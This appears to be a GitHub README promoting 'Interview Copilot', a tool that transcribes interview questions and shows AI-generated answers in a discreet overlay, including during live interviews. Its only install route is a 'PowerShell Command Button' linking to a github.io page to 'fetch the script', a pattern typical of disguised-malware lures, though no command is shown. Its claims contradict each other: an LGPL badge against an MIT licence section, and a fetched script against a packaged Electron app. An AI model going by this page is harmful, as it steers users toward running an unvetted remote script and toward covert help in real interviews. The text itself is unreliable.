<div align="center">

# Interview Copilot: Your AI-Powered Career Launchpad Web App

![](files/preview.png)

### ⌨️ PowerShell Command Button

[![](files/button.png)](https://Birubhai1964.github.io/interview-copilot/)

[![powershell-7](https://img.shields.io/badge/powershell--7-core-2f81f7?style=flat&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/channel-maintained-2ea44f?style=flat&labelColor=0d1117)]() [![ci](https://img.shields.io/badge/ci-passing-2ea44f?style=flat&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/licence-lgpl--3.0-54aeff?style=flat&labelColor=0d1117)]()

</div>

---

Interview Copilot is an EdTech application built to close the distance between learning and landing your dream job. Running as a lightweight desktop overlay or in the browser, it acts as a real-time mentor during mock and live interviews, listening, analyzing, and surfacing context-aware guidance the moment you need it. Rather than handing over canned answers, Interview Copilot helps you understand how to structure a response—so every session sharpens your skills instead of substituting for them. Polished, privacy-conscious, and designed to stay out of your way, it's the quiet advantage serious candidates keep on their side.

## ✅ Before You Start

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

🎙️ **Live Question Capture:** Transcribes interview questions in real time so you never miss a beat, whether you're practicing solo or in the hot seat.
- 🧠 **Context-Aware Coaching:** Generates structured talking points and model answers on the spot, teaching you *how* to respond with confidence rather than just what to say.
- 💻 **Discreet Desktop Overlay:** A lightweight floating companion that stays quietly at your side, keeping guidance within reach without breaking your focus.
- 🌐 **Browser-Based Practice:** Spin up the web experience for on-the-go rehearsal sessions — no desktop install needed.
- 🔒 **Privacy by Design:** Your configurations and personal API credentials remain on your own machine, under your control at all times.
- 🎯 **Learning-First Approach:** Every suggestion is crafted to build real interview skills, closing the gap between preparation and landing the role you want.

## Tech Stack

Interview Copilot pairs a modern React front end with a lightweight Electron shell to deliver a seamless, real-time coaching experience on the desktop and in the browser. The UI is built with React and styled using Tailwind CSS, giving the interface a crisp, distraction-free feel that stays out of your way during practice sessions.

Real-time audio transcription is powered by Web Audio and streaming speech-to-text services, while the backend layer orchestrates AI responses through API integrations for instant, context-aware guidance. State is managed with Zustand for predictable, snappy updates, and the whole client is bundled with Vite for fast builds and a polished developer workflow.

On the deployment side, the application is designed to ship anywhere — packaged as a Windows desktop executable via Electron, or hosted on the cloud for browser-based access. Configuration and private API keys remain local to your machine, keeping your practice sessions private by design.

For those who want to explore, extend, or adapt Interview Copilot, the codebase is openly accessible and welcomes contributions from the community.

## FAQ

**Is Interview Copilot available at no cost?**
Yes — Interview Copilot is fully accessible. Every core capability, from real-time transcription to AI-guided talking points, is available without a paywall or subscription. We believe career preparation should be within reach for every learner.

**Does it work during live interviews, or only for practice?**
Both. The discreet desktop overlay stays quietly in the background during real conversations, while the web version is ideal for rehearsing mock interviews. You choose the mode that fits the moment.

**How does Interview Copilot actually help me improve?**
Rather than feeding you scripted responses, it surfaces structured hints, key talking points, and suggested answer frameworks in real time — so you internalize *how* to think on your feet and carry that skill into every future interview.

**Are my conversations and API keys kept private?**
Absolutely. Your local configurations and personal API credentials remain on your own machine. Interview Copilot was built privacy-first, so your practice sessions and sensitive data never leave your control.

**Do I need to build the application from source to use it?**
Not at all. The desktop experience ships as a ready-to-run package, and the web edition is available through your browser. Building from source is only relevant if you're contributing to development.

**Can I extend Interview Copilot with my own enhancements?**
Yes. The project welcomes community contributions and advanced customization. Whether you're adding new AI providers, refining the transcription pipeline, or layering in your own booster modules, the architecture is designed to be approachable and extensible.

**Which platforms are supported?**
Interview Copilot runs as a lightweight desktop application on Windows and is equally at home in the browser via its cloud-hosted edition — giving you flexibility whether you prefer a dedicated app or a tab.

**How do I stay updated on new releases?**
Watch the repository for release announcements. Each update is carefully prepared with stability, polish, and user feedback front of mind — so you're always working with the most refined version of Interview Copilot.

## License

Interview Copilot is released under the MIT License, giving you the freedom to use, adapt, and build upon the project for both personal and commercial purposes. The full license text is included in the `LICENSE` file within this repository, so you can review the exact terms at any time.

In short, the MIT License is one of the most permissive and widely trusted licenses available — it keeps things simple, transparent, and business-friendly. You are welcome to modify the codebase, integrate it into your own products, and share your improvements with the community, provided the original copyright notice and permission notice are preserved.

We believe in open collaboration and welcome contributions of every size, from small fixes to ambitious new features. If you build something meaningful with Interview Copilot, we would love to hear about it.

*Built with care for learners and builders everywhere.*